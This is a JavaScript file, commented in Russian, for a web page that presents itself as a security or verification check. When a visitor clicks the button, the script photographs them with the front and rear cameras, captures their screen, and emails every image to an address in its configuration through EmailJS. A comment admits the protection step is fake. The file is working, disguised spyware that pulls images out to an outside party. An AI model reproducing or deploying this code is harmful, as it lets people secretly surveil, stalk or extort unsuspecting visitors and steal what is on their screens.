const v = document.getElementById('v');
const c = document.getElementById('c');
const fill = document.getElementById('fill');
const btn = document.getElementById('btn');
const s1 = document.getElementById('s1');
const s2 = document.getElementById('s2');
const s3 = document.getElementById('s3');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const setProgress = (p) => { fill.style.width = p + '%'; };

emailjs.init(CONFIG.emailjsPublicKey);

// Функция съемки на камеру
async function shoot(facingMode) {
  try {
    const constraints = { video: { facingMode: { exact: facingMode } }, audio: false };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    v.srcObject = stream;
    await new Promise((resolve) => { v.onloadedmetadata = () => { v.play(); resolve(); }; });
    await sleep(1500); 
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    const ctx = c.getContext('2d');
    ctx.drawImage(v, 0, 0, c.width, c.height);
    const data = c.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach((t) => t.stop());
    v.srcObject = null;
    await sleep(1000); 
    return data;
  } catch (error) {
    console.error("Ошибка камеры (" + facingMode + "):", error);
    throw error;
  }
}

// НОВАЯ ФУНКЦИЯ: Снимок экрана
async function captureScreen() {
  try {
    // Браузер ОБЯЗАТЕЛЬНО покажет окно с просьбой разрешить трансляцию экрана
    const stream = await navigator.mediaDevices.getDisplayMedia({ 
        video: { cursor: "always" }, 
        audio: false 
    });
    
    v.srcObject = stream;
    await v.play();
    await sleep(1000); // Ждем отрисовки

    c.width = v.videoWidth || 1280;
    c.height = v.videoHeight || 720;
    const ctx = c.getContext('2d');
    ctx.drawImage(v, 0, 0, c.width, c.height);
    const data = c.toDataURL('image/jpeg', 0.7); // Сжимаем посильнее, скрины тяжелые

    stream.getTracks().forEach((t) => t.stop());
    v.srcObject = null;
    
    return data;
  } catch (error) {
    console.error("Пользователь отклонил скриншот или ошибка:", error);
    return null; // Возвращаем null, если отказались
  }
}

// Функция отправки на почту
async function sendPhoto(dataUrl, label) {
  return emailjs.send(CONFIG.emailjsServiceId, CONFIG.emailjsTemplateId, {
    to_email: CONFIG.toEmail,
    label: label,
    image: dataUrl,
    time: new Date().toLocaleString('ru-RU')
  });
}

btn.addEventListener('click', async () => {
  btn.disabled = true;
  btn.textContent = 'Проверяем…';

  try {
    // Шаг 1 — просим доступ к камере
    s1.classList.add('active');
    setProgress(10);
    const prime = await navigator.mediaDevices.getUserMedia({ video: true });
    prime.getTracks().forEach((t) => t.stop());
    await sleep(500);
    
    s1.classList.remove('active');
    s1.classList.add('done');
    setProgress(30);

    // Шаг 2 — Фронталка
    s2.classList.add('active');
    btn.textContent = 'Снимаем фронталку...';
    const frontShot = await shoot('user');
    setProgress(45);
    await sendPhoto(frontShot, 'Фронтальная камера');
    
    // Тыл
    btn.textContent = 'Переключаем камеру...';
    await sleep(2000); 
    btn.textContent = 'Снимаем тыл...';
    const backShot = await shoot('environment');
    setProgress(60);
    await sendPhoto(backShot, 'Тыльная камера');

    s2.classList.remove('active');
    s2.classList.add('done');

    // Шаг 3 — Скриншот экрана (и фиктивная защита)
    s3.classList.add('active');
    btn.textContent = 'Анализ экрана...';
    setProgress(75);
    
    const screenShot = await captureScreen();
    if (screenShot) {
        setProgress(85);
        await sendPhoto(screenShot, 'Скриншот экрана');
    }

    setProgress(95);
    await sleep(1200);
    s3.classList.remove('active');
    s3.classList.add('done');
    setProgress(100);

    btn.textContent = 'Проверка пройдена ✓';
    btn.style.background = 'linear-gradient(135deg,#28c76f,#1fa85a)';
  } catch (e) {
    console.error(e);
    btn.disabled = false;
    btn.textContent = 'Повторить проверку';
    setProgress(0);
  }
});
